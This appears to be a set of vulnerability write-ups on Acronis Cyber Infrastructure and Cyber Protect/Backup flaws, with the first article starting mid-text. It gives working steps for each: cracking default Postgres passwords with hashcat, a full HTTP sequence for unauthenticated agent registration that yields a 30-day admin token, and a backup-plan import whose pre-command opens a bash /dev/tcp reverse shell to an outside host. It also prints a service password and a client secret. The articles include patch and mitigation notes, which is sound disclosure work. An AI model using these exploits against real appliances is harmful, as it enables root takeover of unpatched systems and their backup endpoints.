exec &>>"${LOG_FILE}"

. ~vstoradmin/libexec/db-functions.sh
. ~vstoradmin/libexec/keystone-functions.sh

grep -q -w "KEYSTONE_SERVICE_PASSWORD" ${BACKEND_CONFIG} || init_keystone
```
It calls two other scripts `db-functions.sh` and `keystone-functions.sh` which are worthwhile to explore and the last `grep` command is very interesting where a `KEYSTONE_SERVICE_PASSWORD` is queried from the file `/usr/libexec/vstorage-ui-backend/etc/backend.cfg`.  

We are getting closer…

If we check the file `/usr/libexec/vstorage-ui-backend/etc/backend.cfg` it actually reveals the password of the vstorage-service-user!!!
```bash
KEYSTONE_USER_MIGRATION=True
KEYSTONE_SERVICE_USER='vstorage-service-user'
KEYSTONE_SERVICE_PASSWORD='3bfda47e79d62f7798e38acc7ff6'
KEYSTONE_SERVICE_PROJECT='admin'
KEYSTONE_ENDPOINT='https://127.0.0.1:5000/v3'
```
Is this the famous default password?  Mmm, this looks too simple…
Let’s check how this password is ending up in this config file.

Let’s explore the other two scripts. 
Browsing thru `keystone-functions.sh`  the first function `gen_keystone_passwd()` already shows that the password gets randomly generated with `openssl` for the `vstorage-service-user`.  This looks like a dead-end street.
```bash
function gen_keystone_passwd() {
    sudo -u vstoradmin openssl rand -hex 14 2>/dev/null

    [ $? -ne 0 ] && error "Unable to generate password for keystone service user" || :
}
```

But… 

After exploring the second script `db-functions.sh`,  interesting new information is revealed because it seems that during the creation and configuration of the database, default passwords are indeed being used.
```bash
configure_db() {
    log_inf "Configure database..."
    create_user "vstoradmin" "CREATEDB CREATEROLE LOGIN REPLICATION PASSWORD 'vstoradmin'"
    create_database "vstoradmin" "vstoradmin"
    log_inf "Database has been configured"
}
```
Database user `vstoradmin` seems to have a default password **vstoradmin**.
That is really interesting, so let’s validate this in the database by querying the passwords for these DB users which are stored in the postgres database table below.
```sql
postgres=# select * from "pg_authid";
          rolname          | rolsuper | rolinherit | rolcreaterole | rolcreatedb | rolcanlogin | rolreplication | rolbypassrls | rolconnlimit |             rolpassword             | rolvaliduntil
---------------------------+----------+------------+---------------+-------------+-------------+----------------+--------------+--------------+-------------------------------------+---------------
 postgres                  | t        | t          | t             | t           | t           | t              | t            |           -1 |                                     |
 pg_monitor                | f        | t          | f             | f           | f           | f              | f            |           -1 |                                     |
 pg_read_all_settings      | f        | t          | f             | f           | f           | f              | f            |           -1 |                                     |
 pg_read_all_stats         | f        | t          | f             | f           | f           | f              | f            |           -1 |                                     |
 pg_stat_scan_tables       | f        | t          | f             | f           | f           | f              | f            |           -1 |                                     |
 pg_read_server_files      | f        | t          | f             | f           | f           | f              | f            |           -1 |                                     |
 pg_write_server_files     | f        | t          | f             | f           | f           | f              | f            |           -1 |                                     |
 pg_execute_server_program | f        | t          | f             | f           | f           | f              | f            |           -1 |                                     |
 pg_signal_backend         | f        | t          | f             | f           | f           | f              | f            |           -1 |                                     |
 vstoradmin                | f        | t          | t             | t           | t           | t              | f            |           -1 | md5dc23b46758bc7e2c4d3d19493c492aae |
 coredns                   | f        | t          | f             | f           | t           | f              | f            |           -1 | md56e2738b0f8848df4ed98977974c83a7e |
 grafana                   | f        | t          | f             | f           | t           | f              | f            |           -1 |                                     |
(12 rows)
```

We can see the md5 hashed passwords in the table for user `vstoradmin` and `coredns` which are in the typical PostgreSQL format of  the string "md5" followed by the md5 hash of a string comprised of the password followed by the postgres username.

Let’s use this logic and check if these accounts are using default passwords with `hashcat`.
```shell
# cat md5.hash
6e2738b0f8848df4ed98977974c83a7e
dc23b46758bc7e2c4d3d19493c492aae
# cat password.txt
vstoradminvstoradmin
corednscoredns
# hashcat --show  -a 0 -m 0 md5.hash password.txt
6e2738b0f8848df4ed98977974c83a7e:corednscoredns
dc23b46758bc7e2c4d3d19493c492aae:vstoradminvstoradmin
```
Or you can do the other way around .
```shell
[root@aci-471-53 libexec]# echo -n "md5"; echo -n "vstoradminvstoradmin" | md5sum | awk '{print $1}'
md5dc23b46758bc7e2c4d3d19493c492aae
[root@aci-471-53 libexec]# echo -n "md5"; echo -n "corednscoredns" | md5sum | awk '{print $1}'
md56e2738b0f8848df4ed98977974c83a7e
[root@aci-471-53 libexec]#
```
And BINGO, the md5 hashed passwords are matching and we have found default passwords!!!!

The final confirmation is to validate a patched version of the Acronis Cyber Infrastructure and check if these flaws have been mitigated.
Checking the `db-functions.sh` on a patched `ACI 5.0.1-61` appliance, shows that no default password is set in the `configure_db()` function.
```shell
configure_db() {
    log_inf "Configure database..."
    create_user "vstoradmin" "CREATEDB CREATEROLE LOGIN REPLICATION"
    create_database "vstoradmin" "vstoradmin"
    log_inf "Database has been configured"
}
```
Also the `pg_auth` table in the postgres database does not show any passwords for the `vstoradmin` and `coredns` database users.
This confirms that the use of default passwords for these accounts have been mitigated.
```sql
postgres=# select * from "pg_authid";
          rolname          | rolsuper | rolinherit | rolcreaterole | rolcreatedb | rolcanlogin | rolreplication | rolbypassrls | rolconnlimit | rolpassword | rolvalidu
ntil
---------------------------+----------+------------+---------------+-------------+-------------+----------------+--------------+--------------+-------------+----------
-----
 postgres                  | t        | t          | t             | t           | t           | t              | t            |           -1 |             |
 pg_monitor                | f        | t          | f             | f           | f           | f              | f            |           -1 |             |
 pg_read_all_settings      | f        | t          | f             | f           | f           | f              | f            |           -1 |             |
 pg_read_all_stats         | f        | t          | f             | f           | f           | f              | f            |           -1 |             |
 pg_stat_scan_tables       | f        | t          | f             | f           | f           | f              | f            |           -1 |             |
 pg_read_server_files      | f        | t          | f             | f           | f           | f              | f            |           -1 |             |
 pg_write_server_files     | f        | t          | f             | f           | f           | f              | f            |           -1 |             |
 pg_execute_server_program | f        | t          | f             | f           | f           | f              | f            |           -1 |             |
 pg_signal_backend         | f        | t          | f             | f           | f           | f              | f            |           -1 |             |
 vstoradmin                | f        | t          | t             | t           | t           | t              | f            |           -1 |             |
 coredns                   | f        | t          | f             | f           | t           | f              | f            |           -1 |             |
 grafana                   | f        | t          | f             | f           | t           | f              | f            |           -1 |             |
(12 rows)

postgres=#
```

### The exploit ###
Now we want to understand how we can exploit this vulnerability.
After digging into the `keystone` db with the privileges of the `vstoradmin` user, it already shows that we can easily add a new administrative user by editing it directly in the `keystone` database.  This administrative user allows us to upload ssh-keys via the ACI Web Portal that enables direct root access via SSH to the appliance.
You will need access to Acronis Web Portal, the PostgreSQL database and the SSH service, but if these three services are available and accessible from the outside world, you can easily hack yourself into any non-patched ACI appliance as user root.

I have created an Metasploit module that does all the magic for you.
You can find this module in Metasploit as [PR 19463 - Acronis Cyber Infrastructure default password remote code execution](https://github.com/rapid7/metasploit-framework/pull/19463).

### Mitigation ###
You should patch your ACI appliance immediately following the Acronis security advisory [SEC-6452](https://security-advisory.acronis.com/advisories/SEC-6452).

### References ###
[CVE-2023-45249](https://nvd.nist.gov/vuln/detail/CVE-2023-45249)
[Acronis security advisory SEC-6452](https://security-advisory.acronis.com/advisories/SEC-6452)
[Acronis ACI Downloads](https://care.acronis.com/s/article/63431-Acronis-Cyber-Infrastructure-how-to-download-ISO?language=en_US)
[Metasploit PR 19463 - Acronis Cyber Infrastructure default password remote code execution](https://github.com/rapid7/metasploit-framework/pull/19463)



---

## CVE-2022-30995
*Posted 2024-10-23 · last revised 2024-10-30*

> Sensitive information disclosure due to improper authentication. The following products are affected: Acronis Cyber Protect 15 (Windows, Linux) before build 29486, Acronis Cyber Backup 12.5 (Windows, Linux) before build 16545.

After my previous attackerkb article [CVE-2023-45249](https://attackerkb.com/topics/T2b62daDsL/cve-2023-45249) on Acronis Cyber Infrastructure with the default password vulnerability, I became curious what else could be found in the Acronis cyber suite of applications. 
Quickly, I bumped into a [security advisory usd-2022-0008](https://herolab.usd.de/security-advisories/usd-2022-0008/) of usd HeroLab explaining a serious security flaw in the Acronis Cyber Protect 15 and Acronis Cyber Backup 12.5 appliance that allows unauthenticated attackers to gain full admin access on the Acronis appliance.

The origin of the security flaw arises from the fact that agents installed on endpoints can register without any authentication on the appliance. 
Probably, this design decision was taken in order to  ease the automation of agent registrations on many endpoints. Unfortunately, the agent registration access is on the level of admin and can be misused to gain full control on the appliance and all the registered endpoints. This makes it a very attractive target for malicious actors with, potentially, a very large attack surface. 

The advisory of usd HeroLab describes the attack sequence for Acronis Cyber Protect 15 which will not work for the Acronis Cyber Backup 12.5 vulnerable versions.

Below is the attack sequence that works for both releases `15` and `12.5`.

**First step: Get the first access token**
```http
POST /idp/token HTTP/1.1
Host: 192.168.201.6:9877
Accept: */*
Content-Type: application/x-www-form-urlencoded
Origin: https://backup.acronis.com
Content-Length: 19
Connection: keep-alive

grant_type=password
```
**Response**
```json
HTTP/1.1 200 OK
Cache-Control: no-store
Content-Length: 1436
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-eval' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'self' https://account.acronis.com https://notary.acronis.com; font-src 'self'; img-src 'self';
Content-Type: application/json
Date: Sun, 20 Oct 2024 13:00:54 GMT
Pragma: no-cache
Vary: Accept-Encoding
X-Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-eval' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'self' https://account.acronis.com https://notary.acronis.com; font-src 'self'; img-src 'self';
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-Xss-Protection: 1; mode=block

{"access_token":"[REDACTED access_token]","token_type":"bearer","expires_in":86399,"id_token":"REDACTED"}
```
**Second step: Register an agent using the `access_token`**
Note: you can generate your own `client_id` uuid.
```json
POST /api/account_server/v2/clients HTTP/1.1
Host: 192.168.201.6:9877
Accept: */*
Authorization: Bearer [REDACTED access_token] 
Content-Type: application/json
Content-Length: 219
Connection: keep-alive

{"client_id":"51088f07-76df-4933-8382-ce8ad4c58401","data":{"agent_type":"backupAgent","hostname":"cuckoo.evil.corp","is_transient":true},"tenant_id":"","token_endpoint_auth_method":"client_secret_basic","type":"agent"}
```
**Response**
```json
HTTP/1.1 201 Created
Cache-Control: no-cache
Content-Length: 1217
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-eval' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'self' https://account.acronis.com https://notary.acronis.com; font-src 'self'; img-src 'self';
Content-Type: application/json
Date: Sun, 20 Oct 2024 13:01:11 GMT
Pragma: no-cache
Vary: Accept-Encoding
X-Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-eval' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'self' https://account.acronis.com https://notary.acronis.com; font-src 'self'; img-src 'self';
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-Xss-Protection: 1; mode=block

{"client_id":"51088f07-76df-4933-8382-ce8ad4c58401","version":0,"client_secret":"ph3mhvz4xqyhx3jk62dten6tau6xjo32qgy6svify5tt5zzgbmnm","registration_access_token":"kp24vdxcku7xgpn72ufnq5sjoi5odggiz2wb4ta4mqls66zkbvge","registration_client_uri":"https://192.168.201.6:9877/api/account_server/clients/51088f07-76df-4933-8382-ce8ad4c58401","type":"agent","tenant_id":"00000000-0000-0000-0000-000000000000","data":{"agent_type":"backupAgent","hostname":"cuckoo.evil.corp","is_transient":true},"token_endpoint_auth_method":"client_secret_basic","_href":"/api/account_server/v2/clients"
,"_links":[{"rel":"get","type":"application/json","href":"/api/account_server/v2/clients/51088f07-76df-4933-8382-ce8ad4c58401"},{"rel":"delete","href":"/api/account_server/v2/clients/51088f07-76df-4933-8382-ce8ad4c58401"},{"rel":"update","type":"application/json","href":"/api/account_server/v2/clients/51088f07-76df-4933-8382-ce8ad4c58401"},{"rel":"add_access_policy","type":"application/json","href":"/api/account_server/v2/clients/51088f07-76df-4933-8382-ce8ad4c58401/access_policies"},{"rel":"access_policies","type":"application/json","href":"/api/account_server/v2/clients/51088f07-76df-4933-8382-ce8ad4c58401/access_policies"}]
}
```
**Last step: Use the `client_id` and `client_secret` to get the admin access token**
```http
POST /idp/token HTTP/1.1
Host: 192.168.201.6:9877
Accept: */*
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 143
Connection: keep-alive

grant_type=client_credentials&client_id=51088f07-76df-4933-8382-ce8ad4c58401&client_secret=ph3mhvz4xqyhx3jk62dten6tau6xjo32qgy6svify5tt5zzgbmnm
```
**Response**
```json
HTTP/1.1 200 OK
Cache-Control: no-store
Content-Length: 816
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-eval' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'self' https://account.acronis.com https://notary.acronis.com; font-src 'self'; img-src 'self';
Content-Type: application/json
Date: Sun, 20 Oct 2024 13:01:25 GMT
Pragma: no-cache
Vary: Accept-Encoding
X-Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-eval' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'self' https://account.acronis.com https://notary.acronis.com; font-src 'self'; img-src 'self';
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-Xss-Protection: 1; mode=block

{"access_token":"[REDACTED admin_token]","token_type":"bearer","expires_in":2591999}
```
And with this admin access_token (valid for 30 days), an unauthenticated attacker can use all the API calls at free will.

For instance, get the version information of the appliance.
```http
GET /api/ams/versions HTTP/1.1
Host: 192.168.201.6:9877
X-Requested-With: XMLHttpRequest
Accept-Language: en-GB,en;q=0.9
Accept: application/json
Content-Type: application/json; charset=utf-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
Referer: http://192.168.201.5:9877/
Accept-Encoding: gzip, deflate, br
Authorization: Bearer [REDACTED admin_token]
Connection: keep-alive

```
**Response**
```json
HTTP/1.1 200 OK
Cache-Control: no-cache
Cache-Control: no-cache
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-eval' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'self' https://account.acronis.com https://notary.acronis.com; font-src 'self'; img-src 'self';
Content-Type: application/json
Date: Sun, 20 Oct 2024 13:01:45 GMT
Expires: -1
Pragma: no-cache
Set-Cookie: session=eyJBQ1JPU0VTU0lPTiI6IldRZkxnNllVaC0zUldTdTEifQ.GfaQuQ.OAc_hunx2cL18m0_i9RM2dlfoho; Expires=Sun, 20-Oct-2024 13:11:45 GMT; Max-Age=600; HttpOnly; Path=/
Vary: Accept-Encoding
X-Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-eval' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'self' https://account.acronis.com https://notary.acronis.com; font-src 'self'; img-src 'self';
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-Xss-Protection: 1; mode=block
Content-Length: 73

{"apiVersions":0,"backendVersion":"12.5.11010","buildNumber":"12.5.3710"}
```

This is of course pretty bad, because you can now pull all configurations of the registered endpoints at the appliance using the admin token in combination with an simple API call `GET /api/ams/resources?embed=details`.
And this information can be used to plan subsequent attacks targeting specific endpoints, such as domain controllers or other interesting infrastructure.

I have created a Metasploit module with [PR 19852](https://github.com/rapid7/metasploit-framework/pull/19582) that exploits this vulnerability and gathers all endpoint information registered at a vulnerable appliance.
This information can then be used in another Metasploit module [PR 19583](https://github.com/rapid7/metasploit-framework/pull/19583) that actually performs a remote code execution in order to gain root or administrator access on the targeted endpoint. A more detailed explanation can be found in the attackerkb article [CVE-2022-3405](https://attackerkb.com/topics/WVI3r5eNIc/cve-2022-3405).

### Mitigation ###
Please patch your appliance to the latest supported version or at least a build version above Acronis Cyber Protect 15 (Windows, Linux) build 29486 or
Acronis Cyber Backup 12.5 (Windows, Linux) build 16545.

### Indicators of Compromise (IOC) ###
Unfortunately, there is not much to go on because all requests are genuine requests and the dummy agent registration does not show up in the activity or alert list at the web console on the appliance.

### References ###
[CVE-2022-30955](https://nvd.nist.gov/vuln/detail/CVE-2022-30955)
[Security advisory usd-2022-0008](https://herolab.usd.de/security-advisories/usd-2022-0008/)
[Acronis Cyber Protect/Backup Downloads](https://care.acronis.com/s/article/71847-Acronis-Cyber-Protect-Links-to-download-installation-files?language=en_US)
[Metasploit PR 19582 - Acronis Cyber Backup/Protect Info Disclosure](https://github.com/rapid7/metasploit-framework/pull/19582)
[Metasploit PR 19583 - Acronis Cyber Backup/Protect RCE](https://github.com/rapid7/metasploit-framework/pull/19583)

### Credits goes to ###
Sandro Tolksdorf of usd AG for the discovery of this vulnerability.

---

## CVE-2022-3405
*Posted 2024-10-23 · last revised 2024-12-06*

> Code execution and sensitive information disclosure due to excessive privileges assigned to Acronis Agent. The following products are affected: Acronis Cyber Protect 15 (Windows, Linux) before build 29486, Acronis Cyber Backup 12.5 (Windows, Linux) before build 16545.

In my previous attackerkb article [CVE-2022-30995](https://attackerkb.com/topics/27RudJXbN4/cve-2022-30995) I explained the vulnerability where an unauthenticated attacker can gain administrative access to the Acronis Cyber protect 15 / Backup 12.5 appliance and disclose sensitive information of the configured endpoint backup targets.
This article is a follow-up of that attack sequence where we actually will exploit this vulnerability and get root access on the appliance itself or one of the configured endpoint backup targets.

This vulnerability has a CVSS v3 Base Score of 8.8 which I personally think is underrated because this exploit allows you to get root or administrator access on the appliance and literally all endpoint backup targets that are configured within the appliance. A rating of 9.8 or 10 would be more appropriate here.

Let’s get started…

For the initial attack sequence to get administrative access to the API using the access token, I refer back to my other article [CVE-2022-30995](https://attackerkb.com/topics/27RudJXbN4/cve-2022-30995) where this is described in detail.
Our journey starts with fact that we successfully captured the administrative access token which by the way is valid for 30 days ;-)

If you read the [documentation](https://www.acronis.com/en-us/support/documentation/AcronisCyberProtect_15/) of the appliance, you will find a few interesting sections with application logic that opens up an avenue to execute remote commands.  One particular [section](https://www.acronis.com/en-us/support/documentation/AcronisCyberProtect_15/index.html#pre-post-commands.html) describes the creation of a backup plan on an endpoint target where you can configure pre- or post commands within the backup sequence. This is of course pretty cool because if we are able to use the API to configure a backup plan on particular endpoint with a pre-command that triggers a remote shell or meterpreter, then we have achieved our admin access on the endpoint.

A nice feature within the web console is that you can create a backup plan and export it to a `json` file which you can import again at the appliance. This will give you a good insight on the structure of a backup plan and how to manipulate the pre-command field in order to achieve a remote code execution.
I have posted an example below of this backup plan where the pre-command is configured with a payload triggering a remote bash shell.

**Import backup plan API request**
```
POST /api/ams/backup/plan_operations/import?createDraftOnError=true HTTP/1.1
Host: 192.168.201.6:9877
Content-Length: 10080
X-Requested-With: XMLHttpRequest
Accept-Language: en-GB,en;q=0.9
Accept: application/json
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZ6ACTlaDLLwA3mQ2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
Origin: http://192.168.201.6:9877
Referer: http://192.168.201.6:9877/
Accept-Encoding: gzip, deflate, br
Authorization: Bearer REDACTED access_token
Connection: keep-alive

------WebKitFormBoundaryZ6ACTlaDLLwA3mQ2
Content-Disposition: form-data; name="planfile"; filename="cuckoo.json"
Content-Type: application/json

{
  "allowedActions": [
    "rename",
    "revoke",
    "runNow"
  ],
  "allowedBackupTypes": [
    "full",
    "incremental"
  ],
  "backupType": "files",
  "bootableMediaPlan": false,
  "editable": true,
  "enabled": true,
  "id": "F37FDF40-45BF-4ECD-A166-9D0345EB099D",
  "locations": {
    "data": [
      {
        "displayName": "/tmp",
        "id": "[[\"ItemType\",\"local_folder\"],[\"LocalID\",\"/tmp\"]]",
        "type": "local_folder"
      }
    ]
  },
  "name": "Oepsie You are Pawned!!!",
  "options": {
    "backupOptions": {
      "prePostCommands": {
        "postCommands": {
          "command": "",
          "commandArguments": "",
          "continueOnCommandError": false,
          "waitCommandComplete": true,
          "workingDirectory": ""
        },
        "preCommands": {
          "command": "bash -c '0<&216-;exec 216<>/dev/tcp/192.168.201.8/1971;sh <&216 >&216 2>&216'",
          "commandArguments": "",
          "continueOnCommandError": true,
          "waitCommandComplete": false,
          "workingDirectory": ""
        },
        "useDefaultCommands": false,
        "usePostCommands": false,
        "usePreCommands": true
      },
      "prePostDataCommands": {
        "postCommands": {
          "command": "",
          "commandArguments": "",
          "continueOnCommandError": false,
          "waitCommandComplete": true,
          "workingDirectory": ""
        },
        "preCommands": {
          "command": "",
          "commandArguments": "",
          "continueOnCommandError": false,
          "waitCommandComplete": true,
          "workingDirectory": ""
        },
        "useDefaultCommands": true,
        "usePostCommands": false,
        "usePreCommands": false
      },
      "scheduling": {
        "interval": {
          "type": "minutes",
          "value": 30
        },
        "type": "distributeBackupTimeOptions"
      },
      "simultaneousBackups": {
        "simultaneousBackupsNumber": null
      },
      "snapshot": {
        "quiesce": true,
        "retryConfiguration": {
          "reattemptOnError": true,
          "reattemptTimeFrame": {
            "type": "minutes",
            "value": 5
          },
          "reattemptsCount": 3,
          "silentMode": false
        }
      },
      "taskExecutionWindow": {},
      "taskFailureHandling": {
        "periodBetweenRetryAttempts": {
          "type": "hours",
          "value": 1
        },
        "retryAttempts": 1,
        "retryFailedTask": false
      },
      "taskStartConditions": {
        "runAnyway": false,
        "runAnywayAfterPeriod": {
          "type": "hours",
          "value": 1
        },
        "waitUntilMet": true
      },
      "validateBackup": false,
      "volumes": {
        "forceVssFullBackup": false,
        "useMultiVolumeSnapshot": true,
        "useNativeVssProvider": false,
        "useVolumeShadowService": true,
        "useVssFlags": [
          "definedRule"
        ]
      },
      "vssFlags": {
        "availableVssModes": [
          "auto",
          "system"
        ],
        "enabled": true,
        "value": "auto",
        "vssFullBackup": false
      },
      "windowsEventLog": {
        "isGlobalConfigurationUsed": true,
        "traceLevel": "warning",
        "traceState": false
      },
      "withHWSnapshot": false
    },
    "specificParameters": {
      "inclusionRules": {
        "rules": [
          "/mnt"
        ],
        "rulesType": "centralizedFiles"
      },
      "type": ""
    }
  },
  "origin": "centralized",
  "route": {
    "archiveSlicing": null,
    "stages": [
      {
        "archiveName": "[Machine Name]-[Plan ID]-[Unique ID]A",
        "cleanUpIfNoSpace": false,
        "cleanup": {
          "time": [
            {
              "backupSet": "daily",
              "period": {
                "type": "days",
                "value": 7
              }
            },
            {
              "backupSet": "weekly",
              "period": {
                "type": "weeks",
                "value": 4
              }
            }
          ],
          "type": "cleanupByTime"
        },
        "destinationKind": "local_folder",
        "locationScript": null,
        "locationUri": "/tmp",
        "locationUriType": "local",
        "maintenanceWindow": null,
        "postAction": {
          "convertToVMParameters": {
            "agentIds": [],
            "cpuCount": null,
            "diskAllocationType": "thick",
            "displayedName": null,
            "enabled": false,
            "exactMemorySize": false,
            "infrastructureType": "",
            "memorySize": null,
            "networkAdapters": [],
            "virtualMachineName": "",
            "virtualServerHost": null,
            "virtualServerHostKey": "[[\"ItemType\",\"\"],[\"LocalID\",\"\"]]",
            "virtualServerStorage": ""
          }
        },
        "rules": [
          {
            "afterBackup": true,
            "backupCountUpperLimit": 0,
            "backupSetIndex": "daily",
            "backupUpperLimitSize": 0,
            "beforeBackup": false,
            "consolidateBackup": false,
            "deleteOlderThan": {
              "type": "days",
              "value": 7
            },
            "deleteYongerThan": {
              "type": "days",
              "value": 0
            },
            "onSchedule": false,
            "retentionSchedule": {
              "alarms": [],
              "conditions": [],
              "maxDelayPeriod": -1,
              "maxRetries": 0,
              "preventFromSleeping": true,
              "retryPeriod": 0,
              "type": "none",
              "unique": false,
              "waitActionType": "run"
            },
            "stagingOperationType": "justCleanup"
          },
          {
            "afterBackup": true,
            "backupCountUpperLimit": 0,
            "backupSetIndex": "weekly",
            "backupUpperLimitSize": 0,
            "beforeBackup": false,
            "consolidateBackup": false,
            "deleteOlderThan": {
              "type": "weeks",
              "value": 4
            },
            "deleteYongerThan": {
              "type": "days",
              "value": 0
            },
            "onSchedule": false,
            "retentionSchedule": {
              "alarms": [],
              "conditions": [],
              "maxDelayPeriod": -1,
              "maxRetries": 0,
              "preventFromSleeping": true,
              "retryPeriod": 0,
              "type": "none",
              "unique": false,
              "waitActionType": "run"
            },
            "stagingOperationType": "justCleanup"
          }
        ],
        "useProtectionPlanCredentials": true,
        "validationRules": null
      }
    ]
  },
  "scheme": {
    "parameters": {
      "backupSchedule": {
        "kind": {
          "dataType": "binary",
          "type": "full"
        },
        "schedule": {
          "alarms": [
            {
              "beginDate": {
                "day": 0,
                "month": 0,
                "year": 0
              },
              "calendar": {
                "days": 65,
                "type": "weekly",
                "weekInterval": 0
              },
              "distribution": {
                "enabled": false,
                "interval": 0,
                "method": 0
              },
              "endDate": {
                "day": 0,
                "month": 0,
                "year": 0
              },
              "machineWake": false,
              "repeatAtDay": {
                "endTime": {
                  "hour": 0,
                  "minute": 0,
                  "second": 0
                },
                "timeInterval": 0
              },
              "runLater": false,
              "skipOccurrences": 0,
              "startTime": {
                "hour": 23,
                "minute": 0,
                "second": 0
              },
              "startTimeDelay": 0,
              "type": "time",
              "utcBasedSettings": false
            }
          ],
          "conditions": [],
          "maxDelayPeriod": -1,
          "maxRetries": 0,
          "preventFromSleeping": true,
          "retryPeriod": 0,
          "type": "daily",
          "unique": false,
          "waitActionType": "run"
        }
      },
      "backupTypeRule": "byScheme"
    },
    "schedule": {
      "daysOfWeek": [
        "monday",
        "tuesday",
        "wednesday",
        "thursday",
        "friday"
      ],
      "effectiveDates": {
        "from": {
          "day": 0,
          "month": 0,
          "year": 0
        },
        "to": {
          "day": 0,
          "month": 0,
          "year": 0
        }
      },
      "machineWake": false,
      "preventFromSleeping": true,
      "runLater": false,
      "startAt": {
        "hour": 23,
        "minute": 0,
        "second": 0
      },
      "type": "daily"
    },
    "type": "weekly_full_daily_inc"
  },
  "sources": {
    "data": [
      {
        "displayName": "cuckoo",
        "hostID": "65A7924F-3CFB-4EEE-8D95-D5201278D8C1",
        "id": "phm.E48C641B-F869-412E-AE9A-2E6A9D0D3443@65A7924F-3CFB-4EEE-8D95-D5201278D8C1.disks"
      }
    ]
  },
  "target": {
    "inclusions": [
      {
        "key": "phm.E48C641B-F869-412E-AE9A-2E6A9D0D3443@65A7924F-3CFB-4EEE-8D95-D5201278D8C1.disks",
        "resource_key": "phm.E48C641B-F869-412E-AE9A-2E6A9D0D3443@65A7924F-3CFB-4EEE-8D95-D5201278D8C1.disks"
      }
    ]
  },
  "tenant": {
    "id": "phm-group.7C2057CC-8D32-40CA-9B83-4A8E73078F7F.disks",
    "locator": "/phm-group.7C2057CC-8D32-40CA-9B83-4A8E73078F7F.disks/",
    "name": "phm-group.7C2057CC-8D32-40CA-9B83-4A8E73078F7F.disks",
    "parentID": ""
  }
}
------WebKitFormBoundaryZ6ACTlaDLLwA3mQ2--
```
**Response**
If successful, it will return the `planId` that can be used to execute the backup plan on a specific endpoint.
```
HTTP/1.1 200 OK
Cache-Control: no-cache
Cache-Control: no-cache
Content-Length: 169
Content-Type: application/json
Content-Security-Policy:default-src 'self'; script-src 'self' 'unsafe-eval' 'unsafe-inline' https://account.acronis.com https://notary.acronis.com https://www.acronis.com https://www.googletagmanager.com https://www.google-analytics.com remotedesktopconnectionclient:; style-src 'self' 'unsafe-inline'; connect-src 'self' https://account.acronis.com https://notary.acronis.com https://www.acronis.com https://www.googletagmanager.com https://www.google-analytics.com remotedesktopconnectionclient:; font-src 'self'; img-src 'self' data: https://account.acronis.com https://notary.acronis.com https://www.acronis.com https://www.googletagmanager.com https://www.google-analytics.com remotedesktopconnectionclient:; frame-src 'self' https://account.acronis.com https://notary.acronis.com https://www.acronis.com https://www.googletagmanager.com https://www.google-analytics.com remotedesktopconnectionclient:;
Date: Sat, 19 Oct 2024 16:01:13 GMT
Expires: -1
Pragma: no-cache
Server: Werkzeug/0.9.3 Python/3.5.3
Set-Cookie: session=eyJBQ1JPU0VTU0lPTiI6IjIxZWZlM2I5NThiNzE4YTAyNDIyODJmNzU3NWE1NjNjZGY1MTQwMmFjNGM3ZjZjMzUyYTc4Y2IxNjYxMDhmYTUifQ.GfVpSQ.pf1qJZH04xv1xv9ywxE_tbxD8ro; Secure; HttpOnly; Path=/
X-Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-eval' 'unsafe-inline' https://account.acronis.com https://notary.acronis.com https://www.acronis.com https://www.googletagmanager.com https://www.google-analytics.com remotedesktopconnectionclient:; style-src 'self' 'unsafe-inline'; connect-src 'self' https://account.acronis.com https://notary.acronis.com https://www.acronis.com https://www.googletagmanager.com https://www.google-analytics.com remotedesktopconnectionclient:; font-src 'self'; img-src 'self' data: https://account.acronis.com https://notary.acronis.com https://www.acronis.com https://www.googletagmanager.com https://www.google-analytics.com remotedesktopconnectionclient:; frame-src 'self' https://account.acronis.com https://notary.acronis.com https://www.acronis.com https://www.googletagmanager.com https://www.google-analytics.com remotedesktopconnectionclient:;
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-Internal-Request-Id: RGLvjgwjYDSQz8eZnvXuwn
X-Request-Id: hXoxoawUe5u3E44naHSuvc
X-Xss-Protection: 1; mode=block

{
   "data":
      {
         "failedFiles": [],
          "importedPlans": [
              {
                 "planId": "2EA2CE9D-6AB7-495D-906A-6E12FADF43CF",
                 "fileName": "cuckoo.json",
                 "draftId": "00000000-0000-0000-0000-000000000000"
              }
           ]
      }
}

```
It is important to understand that you need to assign a backup plan to a specific endpoint target which is defined in the appliance. You will need three important  identifiers:
`[+] hostId`
`[+] parentId`
`[+] key`

You can collect this information with Metasploit recon module that you can find here [Metasploit PR 19582 - Acronis Cyber Backup/Protect Info Disclosure](https://github.com/rapid7/metasploit-framework/pull/19582).
```msf
msf6 > use auxiliary/gather/acronis_cyber_protect_machine_info_disclosure
msf6 auxiliary(gather/acronis_cyber_protect_machine_info_disclosure) > set rhosts 192.168.201.6
rhosts => 192.168.201.6
